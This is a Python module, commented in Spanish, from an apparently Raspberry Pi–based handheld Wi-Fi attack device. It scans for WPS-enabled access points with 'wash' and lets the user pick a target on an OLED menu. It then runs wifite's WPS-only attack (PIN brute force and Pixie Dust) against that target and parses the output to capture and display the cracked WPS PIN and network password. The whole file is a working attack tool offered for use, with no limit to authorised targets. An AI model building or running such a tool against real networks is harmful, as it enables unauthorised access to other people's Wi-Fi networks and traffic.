# modules/attack_wps.py
import os
import re
import signal
import subprocess
import time
import queue
import threading
import pty
import select
import RPi.GPIO as GPIO

import config
from gui import oled_menu

CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))


# ------------------------------------------------------------------ #
#  UTILIDADES                                                        #
# ------------------------------------------------------------------ #
def clean_ansi(text):
    """Elimina códigos de escape ANSI y normaliza retornos de carro."""
    ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
    return ansi_escape.sub('', text).replace('\r', '\n')


def stop_process(proc):
    """Termina de forma segura un grupo de procesos."""
    if proc and proc.poll() is None:
        try:
            os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
            time.sleep(0.3)
            if proc.poll() is None:
                os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
        except Exception:
            pass


def pty_reader(master_fd, out_queue, stop_event):
    """Lee la salida de la PTY y la mete en la cola (evita buffering)."""
    while not stop_event.is_set():
        try:
            r, _, _ = select.select([master_fd], [], [], 0.3)
            if master_fd in r:
                try:
                    data = os.read(master_fd, 4096)
                except OSError:
                    break
                if not data:
                    break
                text = clean_ansi(data.decode("utf-8", errors="ignore"))
                for chunk in text.split("\n"):
                    chunk = chunk.strip()
                    if chunk:
                        out_queue.put(chunk)
        except Exception:
            break
    try:
        os.close(master_fd)
    except Exception:
        pass


# ------------------------------------------------------------------ #
#  ESCANEO WPS CON WASH                                              #
# ------------------------------------------------------------------ #
def scan_wps_networks(interfaz=None, tiempo_escaneo=12):
    """
    Ejecuta 'wash' durante N segundos y parsea las redes con WPS activo.
    Devuelve lista de dicts: bssid, essid, ch, signal, locked, vendor.
    """
    if interfaz is None:
        interfaz = config.INTERFACE

    oled_menu.show_message("ESCANEANDO WPS", "Ejecutando wash...",
                           "Espere un momento")

    cmd = f"sudo timeout {tiempo_escaneo} wash -i {interfaz}"

    try:
        resultado = subprocess.run(
            cmd, shell=True, capture_output=True, text=True,
            timeout=tiempo_escaneo + 5,
        )
        stdout = resultado.stdout or ""
    except subprocess.TimeoutExpired:
        stdout = ""

    # BSSID            Ch  dBm  WPS   Lck  Vendor     ESSID
    # C6:16:C8:6D:7A:54  4  -85  2.0   No   Unknown    quechuandes
    patron = re.compile(
        r"^([0-9A-Fa-f]{2}(?::[0-9A-Fa-f]{2}){5})\s+"  # BSSID
        r"(\d+)\s+"                                     # canal
        r"(-?\d+)\s+"                                   # señal dBm
        r"([\d\.]+)\s+"                                 # versión WPS
        r"(Yes|No)\s+"                                  # Locked
        r"(\S+)\s+"                                     # Vendor
        r"(.+)$"                                        # ESSID
    )

    redes = []
    for linea in stdout.splitlines():
        linea = linea.strip()
        m = patron.match(linea)
        if m:
            bssid, ch, dbm, wps_ver, locked, vendor, essid = m.groups()
            redes.append({
                "bssid": bssid,
                "essid": essid.strip() or "Oculta",
                "ch": ch,
                "signal": int(dbm),
                "locked": locked.lower() == "yes",
                "vendor": vendor,
            })

    redes.sort(key=lambda r: r["signal"], reverse=True)
    return redes


# ------------------------------------------------------------------ #
#  LANZAR WIFITE WPS CON PTY                                         #
# ------------------------------------------------------------------ #
def run_wifite_wps(target_bssid):
    """Lanza wifite en modo WPS con PTY. Devuelve (proc, master_fd)."""
    cmd = [
        "sudo", "wifite",
        "-i", config.INTERFACE,
        "-b", target_bssid,
        "--wps-only",
        "--no-pmkid",
        "--kill",
    ]

    master, slave = pty.openpty()

    proc = subprocess.Popen(
        cmd,
        stdin=slave,
        stdout=slave,
        stderr=slave,
        preexec_fn=os.setsid,
        close_fds=True,
    )
    os.close(slave)

    return proc, master


# ------------------------------------------------------------------ #
#  CLASIFICADOR DE FASES                                             #
# ------------------------------------------------------------------ #
_PATRONES_FASE = [
    # Fin / éxito
    ("FINALIZADO", re.compile(r"finished|exiting|quitting|stopping",
                              re.IGNORECASE)),
    # PSK obtenida (fin del ataque con éxito)
    ("PSK_OK",     re.compile(r"wps.*psk|psk.*found|cracked.*psk",
                              re.IGNORECASE)),
    # PIN encontrado
    ("PIN_OK",     re.compile(r"wps pin|cracked.*pin|pin.*found|pin.*[:=]",
                              re.IGNORECASE)),
    # Pixie Dust
    ("PIXIE",      re.compile(r"pixie|pixiewps|pixie-dust", re.IGNORECASE)),
    # Probando PINs
    ("PROBANDO",   re.compile(r"trying pin|testing pin|pin.*attempt|"
                              r"brute.*pin|sending.*pin", re.IGNORECASE)),
    # Bloqueado
    ("BLOQUEADO",  re.compile(r"wps.*lock|ap.*lock|locked.*wps|ratelimit",
                              re.IGNORECASE)),
    # Escaneando
    ("ESCANEANDO", re.compile(r"scan|looking for|enumerating|found \d+ "
                              r"(wps|ap|client)", re.IGNORECASE)),
]

_ORDEN = {
    "ESCANEANDO": 1,
    "PROBANDO":   2,
    "PIXIE":      3,
    "BLOQUEADO":  4,
    "PIN_OK":     5,
    "PSK_OK":     6,
    "FINALIZADO": 7,
}

# Texto que se muestra en la OLED para cada fase
_TEXTO_FASE = {
    "ESCANEANDO": "Escaneando red",
    "PROBANDO":   "Probando PIN",
    "PIXIE":      "Pixie Dust",
    "BLOQUEADO":  "AP bloqueado",
    "PIN_OK":     "PIN encontrado",
    "PSK_OK":     "Clave encontrada",
    "FINALIZADO": "Finalizando...",
}


def _detectar_fase(line, fase_actual):
    """Devuelve la fase según la línea. Solo avanza, nunca retrocede."""
    for nombre, patron in _PATRONES_FASE:
        if patron.search(line):
            if _ORDEN[nombre] >= _ORDEN.get(fase_actual, 0):
                return nombre
    return fase_actual


# ------------------------------------------------------------------ #
#  BUCLE PRINCIPAL                                                   #
# ------------------------------------------------------------------ #
def start_wps_attack_loop():
    """Bucle principal del módulo WPS con UI normalizada."""
    if not config.INTERFACE:
        oled_menu.show_message("ERROR INTERFAZ", "No hay tarjeta", "en modo monitor")
        time.sleep(2)
        return

    # --- 1. ESCANEO PREVIO ---
    wifi_list = scan_wps_networks(tiempo_escaneo=12)

    items_menu = ["<- VOLVER"]
    if wifi_list:
        for red in wifi_list:
            marca = " [L]" if red["locked"] else ""
            items_menu.append(f"{red['essid'][:16]}{marca}")
    else:
        items_menu.append("Sin redes WPS")

    estado = "LISTA"
    index  = 0
    target = None

    wifite_proc = None
    out_queue   = None
    reader_stop = None

    pin_final = ""
    psk_final = ""
    fase      = "ESCANEANDO"

    # Regex de captura
    RE_PIN = re.compile(
        r"(?:WPS PIN|Cracked WPS PIN|PIN)\s*[:=]\s*['\"]?(\d{4,8})",
        re.IGNORECASE,
    )
    RE_PSK = re.compile(
        r"(?:WPS PSK|Cracked WPS PSK|PSK|KEY)\s*[:=]\s*(.+)$",
        re.IGNORECASE,
    )

    try:
        while True:
            # ==================================================== #
            # ESTADO 1: MENÚ DE SELECCIÓN                          #
            # ==================================================== #
            if estado == "LISTA":
                oled_menu.draw_menu("WPS ATTACK", items_menu, index)

                if GPIO.input(config.BTN_UP) == GPIO.LOW:
                    index = (index - 1) % len(items_menu)
                    time.sleep(0.2)
                elif GPIO.input(config.BTN_DOWN) == GPIO.LOW:
                    index = (index + 1) % len(items_menu)
                    time.sleep(0.2)
                elif GPIO.input(config.BTN_SELECT) == GPIO.LOW:
                    time.sleep(0.3)

                    if index == 0:
                        return

                    if wifi_list and index <= len(wifi_list):
                        target = wifi_list[index - 1]
                        pin_final = ""
                        psk_final = ""
                        fase      = "ESCANEANDO"

                        if target["locked"]:
                            oled_menu.show_message(
                                "WPS BLOQUEADO",
                                target["essid"][:16],
                                "El ataque puede fallar"
                            )
                            time.sleep(1.5)

                        oled_menu.show_message(
                            "INICIANDO WPS",
                            target["essid"][:16],
                            "Buscando PIN..."
                        )

                        # Lanzar wifite con PTY
                        wifite_proc, master_fd = run_wifite_wps(target["bssid"])

                        # Cola + hilo lector
                        out_queue   = queue.Queue()
                        reader_stop = threading.Event()
                        t = threading.Thread(
                            target=pty_reader,
                            args=(master_fd, out_queue, reader_stop),
                            daemon=True,
                        )
                        t.start()

                        estado = "ATACANDO"
                        time.sleep(0.3)

            # ==================================================== #
            # ESTADO 2: ATAQUE EN CURSO                            #
            # ==================================================== #
            elif estado == "ATACANDO":
                # Procesar toda la cola
                while True:
                    try:
                        line = out_queue.get_nowait()
                    except queue.Empty:
                        break

                    # Actualizar fase (solo avanza)
                    fase = _detectar_fase(line, fase)

                    # Capturar PIN
                    m_pin = RE_PIN.search(line)
                    if m_pin:
                        pin_final = m_pin.group(1).strip()
                        # No forzamos cambio de fase aquí: el PIN puede
                        # aparecer antes que la PSK, el ataque continúa
                        # para intentar recuperar la PSK.

                    # Capturar PSK (prioridad máxima)
                    m_psk = RE_PSK.search(line)
                    if m_psk:
                        psk_final = m_psk.group(1).strip().strip("'\"")
                        if psk_final and len(psk_final) >= 4:
                            fase = "PSK_OK"

                    # Fin del ataque
                    if fase == "FINALIZADO":
                        stop_process(wifite_proc)
                        if reader_stop:
                            reader_stop.set()
                        time.sleep(0.5)
                        estado = "RESULTADO"
                        break

                # --- Render: una sola línea con la fase actual ---
                if estado == "ATACANDO":
                    oled_menu.clear_screen()

                    # Header invertido con ESSID
                    oled_menu.draw.rectangle((0, 0, oled_menu.W - 1, 11), fill=255)
                    oled_menu.draw.text((3, 0), target['essid'][:16],
                                        font=oled_menu.font_title, fill=0)

                    # Si estamos probando PIN, mostrar el PIN actual
                    # Si no, mostrar el texto de la fase
                    if fase == "PROBANDO" and pin_final:
                        texto = f"PIN: {pin_final}"
                    else:
                        texto = _TEXTO_FASE.get(fase, "Trabajando...")

                    tw, _ = oled_menu._text_size(texto, oled_menu.font_title)
                    x = max(0, (oled_menu.W - tw) // 2)
                    oled_menu.draw.text((x, 26), texto,
                                        font=oled_menu.font_title, fill=255)

                    # Footer
                    oled_menu.draw.text((2, 56), "SELECT: cancelar",
                                        font=oled_menu.font_small, fill=255)

                    oled_menu.refresh()

                # Cancelación con SELECT
                if GPIO.input(config.BTN_SELECT) == GPIO.LOW:
                    time.sleep(0.3)
                    stop_process(wifite_proc)
                    if reader_stop:
                        reader_stop.set()
                    oled_menu.show_message("CANCELADO", "Ataque detenido",
                                           "por el usuario")
                    time.sleep(1.5)
                    return

            # ==================================================== #
            # ESTADO 3: RESULTADO                                  #
            # ==================================================== #
            elif estado == "RESULTADO":
                oled_menu.clear_screen()

                # Header invertido
                oled_menu.draw.rectangle((0, 0, oled_menu.W - 1, 11), fill=255)
                oled_menu.draw.text((2, 0), f"RED: {target['essid'][:14]}",
                                    font=oled_menu.font_title, fill=0)

                if psk_final:
                    # Caso ideal: tenemos la clave WiFi
                    oled_menu.draw.text((2, 18), "CLAVE:",
                                        font=oled_menu.font_small, fill=255)
                    oled_menu.draw_wrapped_text(psk_final, 30, max_chars=20)
                    if pin_final:
                        oled_menu.draw.text(
                            (2, 46), f"PIN: {pin_final}",
                            font=oled_menu.font_small, fill=255
                        )
                elif pin_final:
                    # Solo PIN (usar para calcular PSK por otros medios)
                    oled_menu.draw.text((2, 18), "PIN WPS:",
                                        font=oled_menu.font_small, fill=255)
                    oled_menu.draw.text((2, 30), pin_final,
                                        font=oled_menu.font_title, fill=255)
                    oled_menu.draw.text((2, 48), "(sin PSK directa)",
                                        font=oled_menu.font_small, fill=255)
                else:
                    # Falló
                    oled_menu.draw.text((2, 20), "Sin resultado",
                                        font=oled_menu.font, fill=255)
                    if target.get("locked"):
                        oled_menu.draw.text((2, 36), "AP bloqueado WPS",
                                            font=oled_menu.font_small, fill=255)
                    else:
                        oled_menu.draw.text((2, 36), "PIN no encontrado",
                                            font=oled_menu.font_small, fill=255)

                oled_menu.draw.text((2, 52), "SELECT: volver",
                                    font=oled_menu.font_small, fill=255)
                oled_menu.refresh()

                if GPIO.input(config.BTN_SELECT) == GPIO.LOW:
                    time.sleep(0.3)
                    return

            time.sleep(0.05)

    finally:
        stop_process(wifite_proc)
        if reader_stop:
            reader_stop.set()


# ------------------------------------------------------------------ #
#  TEST RÁPIDO DESDE TERMINAL (sin OLED)                             #
# ------------------------------------------------------------------ #
if __name__ == "__main__":
    redes = scan_wps_networks(tiempo_escaneo=8)
    print(f"\n[+] Se encontraron {len(redes)} redes con WPS:")
    for i, red in enumerate(redes):
        lock = "LOCKED" if red["locked"] else "OK"
        print(f"{i+1}. {red['essid'][:15]:<15} | {red['bssid']} | "
              f"{red['signal']}dBm | ch{red['ch']} | [{lock}]")
